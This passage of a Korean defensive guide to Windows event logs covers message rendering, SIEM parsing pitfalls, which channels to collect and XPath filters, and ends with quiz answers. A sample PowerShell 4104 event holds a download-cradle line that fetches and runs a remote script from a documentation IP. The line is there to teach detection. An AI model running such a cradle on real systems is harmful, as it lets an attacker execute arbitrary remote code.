- `%1`은 템플릿의 <strong>첫 번째</strong> `<data>` 줄(`SubjectUserSid`), `%2`는 두 번째(`SubjectUserName`), … `%9`는 `LogonType`, `%19`는 `IpAddress`, `%27`은 `ElevatedToken`입니다.
- 문장 속 순서는 템플릿 순서와 <strong>다릅니다</strong>. `Logon Type: %9`는 위쪽에, `Logon Process: %10`은 아래쪽에 있습니다. 설명 문구를 쓴 사람이 사람이 읽기 좋게 줄을 배치한 겁니다.
- 어떤 이름표는 칸 이름보다 친절합니다. 템플릿의 `TargetUserName`은 "New Logon → Account Name"으로, `IpAddress`는 "Source Network Address"로 나옵니다. 동료가 일반 탭에서 값을 읽어 주면, SIEM에서 그 칸을 찾으려면 이 대응표가 필요합니다.
- 칸 안의 `%%1833` 같은 값은 두 번째 단계에서 공급자의 메시지 표로 바뀝니다. `%%1833` → "Impersonation", `%%1843` → "No", `%%1842` → "Yes". 그래서 XML에는 `%%1843`, 일반 탭에는 "No"가 보입니다.
- 끝의 긴 문단("This event is generated when …")은 모든 4624에 똑같이 붙는 고정 도움말입니다. 메시지가 이벤트 크기를 몇 배로 키우는 이유 중 하나입니다.

<strong>[보충] 메시지를 만들 때 SID도 이름으로 바뀝니다.</strong> 일반 탭에서 값이 `S-1-5-18`인 `Security ID: %1`은 <strong>SYSTEM</strong>으로, 도메인 사용자 SID는 `CORP\a.kim`으로 나옵니다. 이벤트 뷰어가 *볼 때* SID를 조회하기 때문입니다. 도메인을 조회할 수 없는 PC(예: 오프라인 분석용 노트북)에서는 SID가 그대로 보입니다. 저장된 데이터는 SID이고, 이름은 편의입니다.

## 하나로 묶어 보기 { #putting-together }

우리가 보는 메시지는 재료 세 가지로 만들어집니다.

```
 System XML               EventData XML                 Provider manifest (on the viewing machine)
 (provider, ID,      +    (values in template order) +  template (field list, version 2)
  version, time …)                                      + description (%1 … %27, %%codes)
          \                         |                              /
           \________________________|_____________________________/
                                    v
                     Rendered "Message" (General tab, Message field)
```

- 왼쪽: System XML(공급자, ID, 버전, 시간 …). 가운데: 템플릿 순서대로 놓인 EventData 값. 오른쪽: *보는 PC에 있는* 공급자 매니페스트 — 템플릿(버전 2의 칸 목록)과 설명 문구(`%1` … `%27`, `%%` 코드).
- 셋이 합쳐져 아래의 "메시지"(일반 탭, Message 칸)가 됩니다.

우리 이벤트로 만든 결과입니다.

```
An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		APP-03$
	Account Domain:		CORP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		10
	Restricted Admin Mode:	No
	Virtual Account:		No
	Elevated Token:		No

Impersonation Level:		Impersonation

New Logon:
	Security ID:		CORP\a.kim
	Account Name:		a.kim
	Account Domain:		CORP
	Logon ID:		0x1D4F2A8
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{b9a4c0de-1f22-7a3e-5d10-6e8f2c9a4b71}

Process Information:
	Process ID:		0x1a8c
	Process Name:		C:\Windows\System32\svchost.exe

Network Information:
	Workstation Name:	APP-03
	Source Network Address:	10.20.7.54
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		User32 
	Authentication Package:	Negotiate
	…
```

XML과 비교하면 모든 변환이 보입니다. `%%1843`은 "No"가 됐고, `S-1-5-18`은 "SYSTEM"이 됐고, `0x3e7`은 `0x3E7`(대문자)이 됐고, System 칸들(시간, 컴퓨터, 키워드)은 문장에 아예 없습니다 — 이벤트 뷰어는 그걸 아래 상자에 따로 보여 줍니다. 그리고 소제목들은 설명 문구가 붙인 것입니다.

### SIEM이 메시지를 파싱하면 안 되는 이유 { #dont-parse-message }

메시지는 사람에게는 쉽고 기계에게는 최악입니다. 여기서 출발지 IP를 뽑는 정규식을 써 본다고 해 봅시다.

```
Source Network Address:\s+(\S+)
```

- `Source Network Address:` — 이 영어 이름표를 찾는다.
- `\s+` — 공백 문자 하나 이상(사이에 있는 탭들).
- `(\S+)` — 그다음에 오는 공백 아닌 글자 묶음을 잡는다: IP.

이 이벤트에서는 됩니다. 그리고 다른 곳에서는 조용히 실패합니다. 다른 언어로 설치된 호스트에서는 이름표가 번역돼서 아무것도 안 잡히고, 4624 버전 0에는 없는 줄이 있고, 값이 빈 이벤트에서는 그 줄이 `-`일 수 있고, `Account Name` 같은 칸은 <strong>두 번</strong>(Subject와 New Logon) 나와서 대충 만든 패턴은 엉뚱한 쪽을 잡고, `LogonProcessName "User32 "`는 끝 공백을 잃습니다. 결국 대부분은 맞는 파서가 됩니다 — 가장 나쁜 종류입니다. 틀린 경우를 아무도 눈치채지 못하니까요.

구조화된 에이전트가 보내는 것과 비교해 보세요. 대부분의 에이전트는 XML 칸을 JSON으로 하나씩 그대로 옮깁니다. 예를 들면 이렇습니다.

```json
{
  "@timestamp": "2026-11-19T22:41:07.531Z",
  "host": { "name": "APP-03.corp.example" },
  "event": { "code": "4624", "provider": "Microsoft-Windows-Security-Auditing", "outcome": "success" },
  "winlog": {
    "channel": "Security",
    "record_id": 883104,
    "version": 2,
    "process": { "pid": 788 },
    "event_data": {
      "TargetUserName": "a.kim",
      "TargetDomainName": "CORP",
      "TargetLogonId": "0x1d4f2a8",
      "LogonType": "10",
      "IpAddress": "10.20.7.54",
      "AuthenticationPackageName": "Negotiate",
      "ElevatedToken": "%%1843"
    }
  }
}
```

- `@timestamp` — `TimeCreated`에서 왔고, UTC 그대로입니다.
- `host.name`, `event.code`, `event.provider`, `winlog.channel`, `winlog.record_id`, `winlog.version`, `winlog.process.pid` — System 부분입니다. 모든 이벤트가 같은 고정된 칸 이름을 씁니다.
- `event.outcome: success` — Keywords 비트마스크에서 뽑아낸 값입니다.
- `winlog.event_data.*` — 원래 이름 그대로의 EventData 칸들. `winlog.event_data.IpAddress:10.20.7.54` 검색은 어느 언어의 어느 호스트에서든 됩니다.
- `ElevatedToken "%%1843"` — 코드를 그대로 두는 에이전트도 있고, "No"로 바꾸는 에이전트도 있습니다. 이 칸에 규칙을 걸기 전에 우리 것이 어느 쪽인지 알아 두세요.

이 JSON은 흔한 오픈소스 에이전트 스타일의 예시이고, 실제 칸 이름은 제품과 SIEM이 공통 스키마로 바꾸는지에 따라 다릅니다. 칸 정규화는 나중에 로그 파이프라인 섹션에서 다룹니다.

## 눈여겨볼 채널 — 무엇을 모을까 { #channels }

### 큰 셋 너머 { #beyond-big-three }

대부분의 조직은 <strong>Security</strong>부터 모으고(맞습니다 — 가장 중요합니다), 이어서 <strong>System</strong>과 <strong>Application</strong>을 더합니다. 이 셋으로 로그온, 프로세스 생성(감사 설정 시), 계정과 그룹 변경, 서비스 설치(System 7045), 프로그램 충돌, 많은 애플리케이션 오류를 볼 수 있습니다. 하지만 요즘 공격 활동 중 상당수는 거기에 전혀 나타나지 않습니다. 카메라가 정문, 엘리베이터, 주차장에만 있는 건물을 떠올려 보세요. 누가 들어왔는지는 보이지만, 서버실에서 무엇을 했는지는 안 보입니다. 다른 채널들이 나머지 방의 카메라입니다.

### 모을 가치가 있는 채널들 { #channel-table }

| 채널(`Get-WinEvent -ListLog`에 나오는 이름) | 기록되는 것 | 핵심 이벤트 ID | 메모 |
| --- | --- | --- | --- |
| `Security` | 감사 이벤트: 로그온, 프로세스 생성, 계정, 그룹, Kerberos, 개체 접근, 정책 변경 | 4624/4625, 4688, 4672, 4720, 4728/4732, 4768/4769, 4719, 1102 | 전적으로 감사 정책에 달림 |
| `System` | OS와 서비스 이벤트 | 7045(서비스 설치), 7036/7040, 104(로그 지움), 6005/6006 | 한 채널에 공급자 여럿 |
| `Application` | 애플리케이션 이벤트 | 1000/1001(충돌), 앱마다 다름 | 품질 들쭉날쭉, 옛 EMET가 여기에 씀 |
| `Microsoft-Windows-PowerShell/Operational` | 파이프라인 실행, 스크립트 블록 | 4103, 4104, 4105/4106 | 정책으로 기록을 켜야 함 |
| `Microsoft-Windows-Security-Mitigations/KernelMode`와 `/UserMode` | 익스플로잇 보호의 차단과 감사 | 완화 기능마다(차단/감사) ID가 다름 | 뜨면 매우 값짐 |
| `Microsoft-Windows-CodeIntegrity/Operational` | App Control for Business(WDAC), 드라이버·이미지 서명 판단 | 3076(감사), 3077(차단), 3033/3063(서명 수준) | 감사 모드를 센서로 활용 |
| `Microsoft-Windows-AppLocker/EXE and DLL`, `/MSI and Script`, `/Packaged app-Execution`, `/Packaged app-Deployment` | AppLocker 허용/감사/차단 | 8002–8007(그리고 패키지 앱 ID들) | 규칙 모음마다 채널 하나 |
| `Microsoft-Windows-Windows Defender/Operational` | 백신 탐지, 조치, 변조 | 1116/1117, 1006/1007, 5001, 5007, 5013 | Defender 경보를 중앙에서 못 받으면 필수 |
| `Microsoft-Windows-Windows Firewall With Advanced Security/Firewall` | 방화벽 규칙·프로필 변경 | 2004/2005/2006(옛 빌드), 2097 등(새 빌드) | 시끄러움, 변경만 거르기 |
| `Microsoft-Windows-Sysmon/Operational` | Sysmon 텔레메트리 | 1, 3, 7, 8, 10, 11, 12–14, 22 … | Sysmon을 깔았다면 무조건 수집 |

이제 하나씩, 왜 모아야 하는지 봅시다.

<strong>PowerShell/Operational — Security 다음으로 가장 중요한 채널.</strong> 많은 공격이 처음부터 끝까지 PowerShell 안에서, 그것도 메모리 안에서만 돌아갑니다. 코드를 내려받아 실행하면서 디스크에 실행 파일을 한 번도 쓰지 않습니다. Security 채널에 남는 건 기껏해야 "`powershell.exe` 시작"(4688)과, 운이 좋으면 인코딩된 명령줄 정도입니다. PowerShell 채널은 <strong>스크립트 블록 로깅(Script Block Logging)</strong>을 켜 두면 코드 자체를 — 그것도 <strong>디코딩한 뒤의 모습으로</strong> — 기록합니다.

```xml
<System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
  <EventID>4104</EventID>
  <Level>5</Level>
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  <Computer>WS-FIN-0217.corp.example</Computer>
  <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1871" />
</System>
<EventData>
  <Data Name="MessageNumber">1</Data>
  <Data Name="MessageTotal">1</Data>
  <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/s.ps1')</Data>
  <Data Name="ScriptBlockId">7d0b3f6e-2c41-4a8e-b1f9-0e5a6c2d9b13</Data>
  <Data Name="Path"></Data>
</EventData>
```

- `Provider Microsoft-Windows-PowerShell`, `EventID 4104` — "스크립트 블록 텍스트 생성": PowerShell이 컴파일하는 코드 덩어리마다 기록합니다. 정책으로 스크립트 블록 로깅을 켜면 남습니다. PowerShell은 정책이 없어도 *수상해 보이는* 블록은 경고로 남기지만, 거기에 기대면 안 됩니다.
- 일반 블록은 `Level 5`(자세히), 수상한 블록은 `Level 3`(경고) — 쓸모 있는 필터입니다.
- `<Security UserID="…-1871" />` — 여기서는 System 부분의 `Security` 칸이 채워져 있습니다. 이 코드를 돌린 PowerShell의 사용자 SID입니다.
- `MessageNumber 1` / `MessageTotal 1` — 긴 스크립트는 여러 이벤트로 나뉩니다. `ScriptBlockId`로 이어 붙이세요.
- `ScriptBlockText` — 코드 자체. 이 줄은 전형적인 <strong>다운로드 크래들(download cradle)</strong>입니다. `203.0.113.45`에서 스크립트를 받아 `IEX`(Invoke-Expression)로 메모리에서 바로 실행합니다. MITRE ATT&CK <strong>T1059.001</strong>(PowerShell)과 <strong>T1105</strong>(도구 반입). 공격자가 `powershell -enc SQBFAFgA…`처럼 인코딩해서 실행했어도 4104에는 풀린 글이 보입니다.
- `Path`가 비어 있음 — `.ps1` 파일에서 불러온 게 아니라, 입력하거나 명령줄로 넘긴 코드라는 뜻입니다.

4103(모듈 로깅)은 실행된 명령을 매개변수와 함께 기록하고, 4105/4106은 켜 두면 스크립트 시작/끝을 표시합니다. PowerShell 로깅의 자세한 내용은 "꼭 알아야 할 이벤트" 섹션에서 다룹니다. 여기서 중요한 건, <strong>이 채널이 없으면 공격 한 갈래가 통째로 안 보인다</strong>는 점, 그리고 아직도 많은 조직이 이걸 켜 두지 않았다는 점입니다. ([PowerShell 다운로드 크래들](../../../adversary/powershell-cradles.md)도 참고하세요.) PowerShell 7은 자기 채널 `PowerShellCore/Operational`에 쓰니, 둘 다 설치돼 있으면 둘 다 모으세요.

<strong>Security-Mitigations(KernelMode와 UserMode).</strong> Windows의 익스플로잇 보호(예전 이름 Exploit Guard, 그 전에는 Application 채널에 쓰던 별도 도구 EMET)가, 임의 코드 방지나 ROP 검사 같은 완화 기능이 무언가를 막거나 감사했을 때 여기에 기록합니다. 여기 차단이 뜨면 대개 <strong>누군가 이 PC의 프로그램을 익스플로잇하려 했다</strong>는 뜻입니다(T1203 클라이언트 실행을 위한 익스플로잇). 값어치는 높고 양은 적습니다. 관련 Defender 기능(공격 표면 축소, 제어된 폴더 액세스, 네트워크 보호)은 Defender 채널에 차단을 기록합니다. 어느 쪽이든 요점은 같습니다. 막는 기능은 알려 주는 기능이기도 해야 합니다. 방어 기능이 공격을 조용히 막고 아무도 안 보면, 공격자의 *다음* 시도 — 성공할 수도 있는 — 를 놓칩니다.

<strong>CodeIntegrity/Operational.</strong> App Control for Business(예전 WDAC)가 여기에 판단을 씁니다. <strong>3076</strong> = "막았을 것"(감사 모드), <strong>3077</strong> = 막음(강제 모드), 그리고 정책 활성화, 서명 요구 사항을 못 맞춘 드라이버·이미지에 관한 이벤트. 서명 없는 드라이버나 취약한 드라이버를 올리는 공격자(BYOVD, EDR을 끄려고 자주 씀 — T1562.001)나, 사용자가 쓸 수 있는 폴더에서 페이로드를 실행하는 경우가 여기 나타납니다.

<strong>AppLocker(채널 여러 개).</strong> 규칙 모음마다 채널이 하나씩 있습니다 — `EXE and DLL`, `MSI and Script`, `Packaged app-Execution`, `Packaged app-Deployment`. EXE와 DLL에서 8002/8003/8004 = 허용 / 감사("막았을 것") / 차단, 스크립트와 MSI에서 8005/8006/8007이 같은 뜻입니다. 모든 애플리케이션 제어가 그렇듯, 차단은 방어이면서 동시에 무언가가 실행되지 말아야 할 곳에서 실행되려 했다는 신호입니다([애플리케이션 제어, FIM, 지속성 잡기](../endpoint-defense/appcontrol-fim-persistence.md) 참고).

<strong>Windows Defender/Operational.</strong> 기본 백신이 탐지(<strong>1116</strong> 탐지, <strong>1117</strong> 조치함, 옛 형식 탐지는 1006/1007)와 설정·상태 변경(<strong>5001</strong> 실시간 보호 꺼짐, <strong>5007</strong> 설정 변경 — 예를 들어 예외 추가, <strong>5013</strong> 변조 방지가 변경을 막음)을 기록합니다. Defender 경보를 중앙 콘솔(Microsoft Defender for Endpoint나 관리 제품)로 받고 있다면 이 채널은 백업이고, 아니라면 백신에 대한 유일한 시야입니다. 가장 중요한 건 변조 이벤트입니다. 공격자가 실시간 보호를 끄거나 `C:\Users\Public\`을 예외로 넣는 건(T1562.001) 무언가를 떨어뜨릴 준비입니다.

<strong>Windows Firewall With Advanced Security/Firewall.</strong> 방화벽 규칙이나 프로필이 바뀔 때 기록합니다. 감사 하위 범주 "MPSSVC 규칙 수준 정책 변경"을 켜 두면 같은 변경이 Security(4946–4950)에도 남습니다. 공격자는 자기 도구용 허용 규칙을 넣거나 프로필을 끕니다(T1562.004). 이 채널은 시끄럽습니다 — 애플리케이션들이 늘 규칙을 넣고 고칩니다. 그러니 예상 밖 프로세스가 넣은 규칙이나 프로필 변경만 거르세요. <strong>[변경됨]</strong> 최근 Windows 11 빌드에서는 이 채널의 규칙 변경 이벤트 ID가 옛 빌드와 다릅니다(예: 옛 빌드의 2004 자리에 2097). 필터를 짜기 전에 우리 빌드에서 공급자 + ID를 확인하세요.

<strong>Sysmon/Operational.</strong> Sysmon을 깔았다면, 그 채널을 모으는 게 Sysmon을 깐 이유의 전부입니다. 해시와 부모 명령줄이 붙은 프로세스 생성(1), 프로세스별 네트워크 연결(3), 이미지 로드(7), 원격 스레드 생성(8), LSASS 열기 같은 프로세스 접근(10), 파일 생성(11), 레지스트리 변경(12–14), 프로세스별 DNS 질의(22) 등.

<strong>[보충] 실제 침해에서 중요한데 자주 잊히는 채널:</strong>

| 채널 | 이유 | 핵심 이벤트 ID |
| --- | --- | --- |
| `Microsoft-Windows-TaskScheduler/Operational` | 예약 작업을 이용한 지속성과 실행(T1053.005) | 106(등록), 140(수정), 141(삭제), 200/201(동작 시작/완료) |
| `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` | 출발지 IP가 붙은 RDP 세션 로그온/재연결/연결 끊김(T1021.001) | 21, 24, 25 |
| `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` | 로그온 전, RDP 네트워크 연결 수락 | 1149 |
| `Microsoft-Windows-WMI-Activity/Operational` | WMI 영구 이벤트 구독 — 파일 없는 지속성(T1546.003) | 5861 |
| `Microsoft-Windows-Bits-Client/Operational` | 다운로드나 지속성에 쓰인 BITS 작업(T1197) | 3, 59, 60 |

### 실제로 켜져 있는지 확인하기 { #check-channels }

모으기로 한 채널이 호스트에서 꺼져 있으면 소용이 없습니다. 확인해 봅시다.

```
PS C:\> 'Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-Sysmon/Operational',
>> 'Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-DNS-Client/Operational' |
>>   ForEach-Object { Get-WinEvent -ListLog $_ -ErrorAction SilentlyContinue } |
>>   Format-Table LogName, IsEnabled, RecordCount, MaximumSizeInBytes -AutoSize

LogName                                      IsEnabled RecordCount MaximumSizeInBytes
-------                                      --------- ----------- ------------------
Microsoft-Windows-PowerShell/Operational          True       11702           15728640
Microsoft-Windows-TaskScheduler/Operational       True        4410           10485760
Microsoft-Windows-DNS-Client/Operational         False           0            1052672
```

- 처음 두 줄은 채널 이름 목록을 만들어서, 하나씩(`ForEach-Object`, `$_` = 지금 이름) `Get-WinEvent -ListLog`에 넘깁니다. 이 명령은 채널 설정을 돌려줍니다.
- `-ErrorAction SilentlyContinue` — 이 호스트에 없는 채널은 오류 대신 그냥 줄이 안 나옵니다.
- `Microsoft-Windows-PowerShell/Operational True 11702` — 켜져 있고 쌓이는 중. (켜져 있다고 스크립트 블록 로깅까지 켜진 건 아닙니다. `ScriptBlockText` 이벤트가 실제로 나오는지 확인하세요.)
- <strong>Sysmon 줄이 아예 없음</strong> — 채널이 없다는 건 여기 Sysmon이 안 깔려 있다는 뜻입니다. Sysmon 기반 탐지는 이 호스트에서 장님입니다.
- `DNS-Client/Operational False 0` — 있지만 꺼져 있음(기본값). 이 채널의 프로세스별 DNS 조회 기록은 쓸모 있지만, 먼저 켜야 합니다.

### 시끄러운 채널에서 필요한 것만 모으기 { #filtering }

모든 채널에서 모든 이벤트를 다 가져올 필요는 없습니다. Windows는 XPath 필터를 씁니다. 이벤트 뷰어 사용자 지정 보기, Windows 이벤트 전달 구독, `Get-WinEvent -FilterXml`, 많은 에이전트에서 문법이 같습니다.

```xml
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-PowerShell/Operational">
    <Select Path="Microsoft-Windows-PowerShell/Operational">*[System[(EventID=4103 or EventID=4104)]]</Select>
  </Query>
  <Query Id="1" Path="Microsoft-Windows-Windows Defender/Operational">
    <Select Path="Microsoft-Windows-Windows Defender/Operational">*[System[(EventID=1116 or EventID=1117 or EventID=5001 or EventID=5007 or EventID=5013)]]</Select>
  </Query>
</QueryList>
```

- `<QueryList>` — 질의 하나 이상을 담는 그릇.
- `<Query Id="0" Path="…">` — 0번 질의, PowerShell 채널 대상.
- `<Select Path="…">` — 이 채널에서 식에 맞는 이벤트를 가져온다.
- `*[System[(EventID=4103 or EventID=4104)]]` — XPath로 "System 부분의 EventID가 4103이나 4104인 모든 이벤트(`*`)". 필터는 <strong>System</strong> 칸 위에서 돕니다. System 칸이 표준화돼 있는 이유가 바로 이것입니다. (`*[EventData[Data[@Name='LogonType']='10']]`처럼 EventData 값으로 거를 수도 있지만, 더 느리고 지원하는 도구도 일부뿐입니다.)
- `<Query Id="1" …>` — Defender 채널에 대한 두 번째 질의. 탐지와 변조 이벤트만 남기고, 늘 나오는 시그니처 업데이트 잡음은 버립니다.

<strong>[주의]</strong> 출발지에서 거를 때는 조심하세요. 호스트에서 버린 이벤트는 그 목적으로는 영원히 사라집니다. 좋은 원칙: 시끄럽고 *그리고* 잘 이해하는 채널만 거르고, Security는 다 가져오고(대신 감사 정책을 조정), 무엇을 버렸는지 적어 두세요. 그래야 앞 페이지의 "결과 0건" 질문에 답할 수 있습니다.

## 섹션 정리: 답할 수 있어야 하는 것 { #summary }

Windows 로그는 복잡하고, Linux(다음 섹션)와는 많이 다릅니다. 이렇게까지 깊이 들어가는 이유는 단순합니다. 이벤트 내용을 읽지 못하고, 어디서 왔는지 모르고, 무엇이 모이고 걸러졌는지 모르면 침해를 찾기가 훨씬 어려워집니다. 그리고 요즘 공격이 남는 채널을 모으지 않으면, 공격이 시작되기도 전에 스스로 손발을 묶은 셈입니다.

우리 환경에 대해 다음 네 질문에 답해 보고, 무언가 바뀔 때마다 다시 보세요.

1. <strong>우리 Windows 감사 정책은 무엇이고, 이벤트를 더 만드는 추가 프로그램이 있나?</strong> (실제 호스트에서 `auditpol`로 본 적용 정책, Sysmon과 그 설정, EDR, 사용자 채널에 쓰는 스크립트.)
2. <strong>Windows 이벤트 시스템 밖에 로그를 쓰는 건 무엇인가?</strong> (IIS, DNS 디버그 로그, 데이터베이스, `C:\ProgramData` 아래 제품들, 텍스트 파일을 쓰는 예약 스크립트 — 그리고 그중 무엇을 모으고 있나?)
3. <strong>어떤 채널과 다른 데이터 소스를 모으고 있나?</strong> (위 표를 점검표로. 호스트 종류별로 — 워크스테이션, 서버, 도메인 컨트롤러 — 하나의 목록으로 퉁치지 말고.)
4. <strong>SIEM에서 XML 칸이 보이나, 메시지가 보이나, 둘 다인가 — 그리고 칸이 모두 파싱되나?</strong> (이벤트 세 개 — 4624, UserData가 있는 1102, 4104 — 를 골라, 필요한 칸이 전부 글 속에 묻히지 않고 검색 가능한 칸인지 확인.)

질문 하나하나가 조사가 틀어지는 길 하나와 짝을 이룹니다. 없는 이벤트(1), 없는 소스(2), 없는 채널(3), 그리고 있기는 한데 검색이 안 되는 데이터(4).

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    이벤트 구조는 바뀌지 않았습니다. 모든 이벤트는 System 부분과 EventData 또는 UserData 부분으로 된 XML이고, 공급자는 버전별 템플릿과 설명 문구를 갖고 있으며, `Get-WinEvent -ListProvider`와 `wevtutil gp`로 여전히 꺼내 볼 수 있고, 메시지는 여전히 볼 때 설명 문구와 EventData로 만들어집니다. 27개 칸을 가진 4624 버전 2, 세션 연결 고리인 `TargetLogonId`, 쓴 쪽을 뜻하는 `Execution ProcessID`, UserData를 쓰는 1102 모두 설명한 그대로입니다. Security, PowerShell/Operational, Defender/Operational, CodeIntegrity, AppLocker, Security-Mitigations, 방화벽, TaskScheduler, TerminalServices, WMI-Activity, Sysmon은 지금도 모을 가치가 있는 채널이고, "메시지 문장 말고 구조화된 칸을 보내라"는 이제 표준 관행입니다.

!!! info "[변경됨] 바뀐 점"
    - **이름.** Windows Defender ATP는 이제 **Microsoft Defender for Endpoint**이고, Windows Defender Application Control은 이제 **App Control for Business**입니다(채널은 같은 CodeIntegrity, 이벤트도 같은 3076/3077). Exploit Guard의 기능들은 Defender의 익스플로잇 보호와 ASR 아래로 들어갔습니다. **EMET**는 2018년에 지원이 끝났으니, 그 Application 채널 이벤트는 옛 시스템에서만 의미가 있습니다.
    - **Sysmon이 Windows 11에 들어왔습니다.** 2026년 2월 선택 업데이트(KB5077241)부터 선택적 기능으로 들어 있고 기본은 꺼져 있습니다. 여전히 켜고 설정해야 하고, 채널도 여전히 모아야 합니다.
    - **PowerShell 7**은 Windows PowerShell의 `Microsoft-Windows-PowerShell/Operational`과 별개인 `PowerShellCore/Operational`에 씁니다. Windows PowerShell만 있던 시절에 만든 수집 목록은 이걸 놓칩니다.
    - **방화벽 채널의 규칙 변경 이벤트 ID**가 최근 Windows 11 빌드에서는 옛 2004/2005/2006과 다릅니다. 몇 년 전에 짠 필터는 조용히 아무것도 안 잡을 수 있습니다.
    - **스키마.** SIEM과 데이터 레이크는 Windows 이벤트를 공통 스키마(Elastic Common Schema, Open Cybersecurity Schema Framework(OCSF), Sentinel의 ASIM)로 정규화하는 경우가 늘었습니다. 그래도 그 대응표를 만드는 기준은 원래의 EventData 이름입니다.
    - **모든 게 채널에 있지는 않습니다.** 예전에 로컬 채널에서 얻던 것의 상당 부분을 이제 EDR 텔레메트리와 클라우드 ID 로그에 기대는 조직이 많습니다. 이것들은 엔드포인트 채널을 보완하지, 대신하지 않습니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **메시지를 정규식으로 파싱하지 마세요** — 언어 번역, 버전, 겹치는 이름표, 있다 없다 하는 줄 때문에 조용히 틀립니다. EventData/UserData를 파싱하세요.
    - **`Execution ProcessID`를 관련 프로세스로 읽지 마세요.** 이벤트를 쓴 쪽입니다(Security라면 LSASS).
    - **`EventData/Data[@Name]`이면 다 된다고 가정하지 마세요** — 1102 같은 UserData 이벤트, 클래식 소스의 이름 없는 `<Data>`를 파이프라인이 처리하는지 확인하세요.
    - **`LogonProcessName "User32 "`처럼 공백이 붙거나 잘린 칸에 정확히 일치를 걸지 마세요.** 먼저 다듬으세요.
    - **Security, System, Application에서 멈추지 마세요.** PowerShell/Operational(스크립트 블록 로깅 켬)과 Sysmon 또는 EDR이 없으면, 메모리 안에서만 도는 PowerShell 공격은 거의 안 보입니다.
    - **호스트를 확인하지 않고 채널 목록을 믿지 마세요** — 꺼진 채널(`IsEnabled False`)과 없는 Sysmon은 "활동 없음"과 똑같아 보입니다.
    - **옛 방화벽·Defender 이벤트 ID 필터를 새 빌드에 그대로 쓰지 마세요.** ID가 아직 맞는지 먼저 확인하세요.

## 확인 문제 { #quiz }

### 문제 1

SIEM에 `APP-03`의 4624가 있고, `Execution ProcessID = 788`, `ProcessName = C:\Windows\System32\svchost.exe`입니다. 동료가 말합니다. "로그온은 프로세스 788이 했으니까, Sysmon 로그에서 프로세스 788이 뭘 실행했는지 보자." 이 생각의 문제는 무엇이고, 로그온한 사용자가 그 뒤에 한 일을 보려면 어느 칸으로 이어 가야 할까요?

??? success "정답과 해설"
    `Execution ProcessID`는 <strong>System</strong> 부분에 있고, 이벤트를 <strong>쓴</strong> 프로세스를 가리킵니다. Security 채널이면 늘 LSASS(여기서는 PID 788)이니, "PID 788이 뭘 실행했나"를 봐도 사용자에 대해선 아무것도 알 수 없습니다. EventData의 `ProcessName`/`ProcessId`는 로그온을 *요청한* 프로세스(여기서는 RDP 서비스)이고, 이것도 사용자의 활동이 아닙니다.

    사용자를 따라가려면 <strong>`TargetLogonId`</strong>(여기서는 `0x1d4f2a8`)로 이어 가세요. 그 세션의 이후 이벤트는 모두 같은 값을 갖습니다. 4688 프로세스 생성과 4672 특수 권한의 `SubjectLogonId`, Sysmon 이벤트의 `LogonId`(Sysmon 1에 `LogonId` 칸이 있음), 짝이 되는 4634/4647 로그오프. 로그온 ID는 PC와 부팅마다만 고유하니 `Computer = APP-03`도 같이 거세요.

### 문제 2

우리 SIEM 파서는 Windows 이벤트의 `EventData/Data` 요소를 이름으로 읽어서 칸을 뽑습니다. 사고 대응 중 모든 서버에서 Security 1102를 찾았더니 이벤트는 나오는데, 사용자 이름 칸이 전부 비어 있습니다. 한편 밤마다 도는 관리자 점검 스크립트(`Write-EventLog`로 만든 것)의 이벤트에는 `param1`이라는 칸만 보입니다. 두 문제를 설명하고, 무엇을 바꿔야 할지 말해 보세요.

??? success "정답과 해설"
    둘 다 "모든 이벤트의 EventData 모양이 같다"는 가정에서 나왔습니다.

    - <strong>1102</strong>는 `<EventData><Data Name=…>`를 쓰지 않습니다. 공급자 고유 요소(`<LogFileCleared>`)가 든 <strong>UserData</strong> 부분이 있고, 그 자식이 `SubjectUserName`, `SubjectLogonId` 등입니다. `EventData/Data[@Name]`만 읽는 파서는 칸을 하나도 못 찾습니다. 파서(또는 에이전트 설정)가 UserData도 펼치게 고치고, 실제 1102로 시험해 보세요. (덧붙여 1102는 감사 공급자가 아니라 `Microsoft-Windows-Eventlog` 공급자가 씁니다. 공급자를 `Security-Auditing`으로 거는 필터는 이걸 통째로 놓칩니다.)
    - <strong>`Write-EventLog`</strong>는 값에 <strong>이름이 없는</strong> `<Data>`로 클래식 이벤트를 만들어서, 파서가 번호밖에 못 붙입니다. `param1`을 받아들이고 거기에 무엇이 드는지 문서로 남기거나, 스크립트가 메시지에 구조화된 글(예: `key=value`나 JSON)을 쓰게 하고 그걸 파싱하거나, 이름 붙은 칸을 정의하는 제대로 된 매니페스트 기반 공급자로 이벤트를 쓰세요.

### 문제 3

새 사이트의 Windows 로그 수집을 검토하게 됐습니다. 에이전트 설정은 모든 호스트에서 Security, System, Application을 모으고, 누군가 옛 가이드에서 복사한 이벤트 ID 2004, 2005, 2006 필터로 `Microsoft-Windows-Windows Firewall With Advanced Security/Firewall`도 모읍니다. 가장 중요한 빈틈을 우선순위대로 말하고, 각각을 호스트에서 어떻게 확인할지 말해 보세요.

??? success "정답과 해설"
    합리적인 우선순위는 이렇습니다.

    1. <strong>PowerShell/Operational</strong>(PowerShell 7이 있으면 `PowerShellCore/Operational`도)을 모으지 않고, 스크립트 블록 로깅도 꺼져 있을 수 있습니다. 이게 없으면 메모리 안 PowerShell 공격(T1059.001)은 거의 안 보입니다. `Get-WinEvent -ListLog`로, 그리고 4104 이벤트가 실제로 있는지로 확인합니다.
    2. <strong>Sysmon/Operational</strong>이나 EDR 텔레메트리. Sysmon이 깔려/켜져 있는지(채널이 있나?), EDR이 빈틈을 메우는지 확인하고, Sysmon이 있으면 그 채널을 모읍니다.
